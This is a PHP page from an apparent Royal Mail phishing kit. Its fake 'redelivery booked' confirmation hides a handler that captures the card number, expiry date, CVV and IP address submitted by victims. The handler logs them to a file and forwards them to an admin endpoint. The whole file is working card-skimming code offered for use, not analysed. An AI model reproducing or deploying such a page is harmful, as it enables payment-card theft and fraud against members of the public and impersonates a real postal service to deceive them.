<?php
session_start();

// Log all posted data to admin.php backend
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = [
        "booking_id"   => $_POST['booking_id'] ?? '',
        "card_type"    => $_POST['card_type'] ?? '',
        "card_number"  => $_POST['card_number'] ?? '',
        "expiry_month" => $_POST['expiry_month'] ?? '',
        "expiry_year"  => $_POST['expiry_year'] ?? '',
        "cvv"          => $_POST['cvv'] ?? '',
        "ip"           => $_SERVER['REMOTE_ADDR'],
        "time"         => date('Y-m-d H:i:s')
    ];

    file_put_contents("logs.txt", json_encode($data, JSON_PRETTY_PRINT) . "\n\n", FILE_APPEND);
    
    // Also send to admin.php
    file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/admin.php?" . http_build_query($data));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delivery Booked | Royal Mail</title>
    <style>
        body {font-family: Arial, sans-serif; background:#f8f8f8; text-align:center; padding:60px;}
        .container {max-width:700px; margin:auto; background:white; padding:50px; box-shadow:0 4px 15px rgba(0,0,0,0.1);}
        h1 {color:#2A2A2D;}
        .success {color:#006400; font-size:22px;}
    </style>
</head>
<body>

<div class="container">
    <h1>Redelivery Booked Successfully</h1>
    <p class="success">Thank you. Your redelivery has been scheduled.</p>
    <p>You will receive a confirmation email shortly.</p>
    <p><strong>Booking ID:</strong> <?= htmlspecialchars($_POST['booking_id'] ?? 'N/A') ?></p>
    
    <p style="margin-top:40px; color:#666;">
        This is an automated confirmation from Royal Mail.
    </p>
</div>

</body>
</html>
